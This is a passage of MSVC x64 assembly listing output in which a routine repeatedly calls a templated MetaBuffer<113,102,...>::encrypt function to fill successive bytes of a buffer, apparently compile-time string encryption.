>::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<113,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
